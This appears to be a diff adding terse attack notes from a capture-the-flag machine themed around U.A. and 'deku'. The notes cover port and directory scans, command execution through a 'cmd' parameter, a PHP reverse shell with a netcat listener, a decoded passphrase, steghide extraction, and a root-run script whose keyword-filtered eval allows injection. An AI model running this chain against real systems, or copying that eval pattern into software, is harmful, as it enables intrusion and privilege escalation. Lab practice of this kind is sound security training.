@@ -1,0 +1,77 @@
+nmap -sC -sV -oN nmap.log 10.48.166.75
+
+
+gobuster dir -u http://10.48.166.75:80 -w /usr/share/wordlists/dirb/big.txt -x php -t 50 | tee gobuster.log
+
+
+wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hh 0 http://10.48.166.75:80/assets/index.php?FUZZ=id
+
+http://10.48.166.75/assets/index.php?cmd=id
+dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
+
+└─$ echo "dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK" | base64 -d
+
+
+└─$ cp /usr/share/webshells/php/php-reverse-shell.php .
+
+python3 -m http.server 8081
+
+wget
+
+nc -lnvp 1234
+
+pwncat -l 1234
+
+
+$ cat passphrase.txt
+QWxsbWlnaHRGb3JFdmVyISEhCg==
+
+
+cat passphrase.txt | base64 -d
+AllmightForEver!!!
+
+eog yuei.jpg
+
+ghex oneforall.jpg
+
+ステガノグラフィー
+ステグハイド
+steghide extract -sf oneforall.jpg
+
+sudo -l
+
+
+deku@ip-10-48-166-75:~$ sudo -l
+[sudo] password for deku: 
+Matching Defaults entries for deku on ip-10-48-166-75:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User deku may run the following commands on
+        ip-10-48-166-75:
+    (ALL) /opt/NewComponent/feedback.sh
+deku@ip-10-48-166-75:~$ 
+
+deku@ip-10-48-166-75:/opt/NewComponent$ cat feedback.sh 
+#!/bin/bash
+
+echo "Hello, Welcome to the Report Form       "
+echo "This is a way to report various problems"
+echo "    Developed by                        "
+echo "        The Technical Department of U.A."
+
+echo "Enter your feedback:"
+read feedback
+
+
+if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
+    echo "It is This:"
+    eval "echo $feedback"
+
+    echo "$feedback" >> /var/log/feedback.txt
+    echo "Feedback successfully saved."
+else
+    echo "Invalid input. Please provide a valid input." 
+fi
+
+
